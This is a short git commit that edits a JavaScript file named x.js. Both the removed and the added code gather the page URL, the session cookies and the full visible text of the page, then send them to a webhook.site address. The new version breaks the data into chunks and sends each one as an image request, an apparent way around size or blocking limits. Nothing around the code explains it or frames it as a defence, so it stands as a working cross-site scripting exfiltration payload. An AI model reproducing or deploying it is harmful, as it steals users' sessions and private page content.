e450ba999a40df23d7368f8185e07f4a05c1102d
syazwanmsm93 <syazwanmsm93@gmail.com>
2026-06-14 05:55:26 +0800

    x.js

--- x.js
+++ x.js
@@ -1,4 +1,4 @@
-navigator.sendBeacon(
-  'https://webhook.site/aafa8677-2f48-451c-8e94-8fc04e13e176',
-  location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText
-);
+let d = location.href + "\nCOOKIE=" + document.cookie + "\nBODY=" + document.body.innerText;
+for (let i = 0; i < d.length; i += 1200) {
+  new Image().src = 'https://webhook.site/aafa8677-2f48-451c-8e94-8fc04e13e176?i=' + i + '&d=' + encodeURIComponent(d.slice(i, i + 1200));
+}
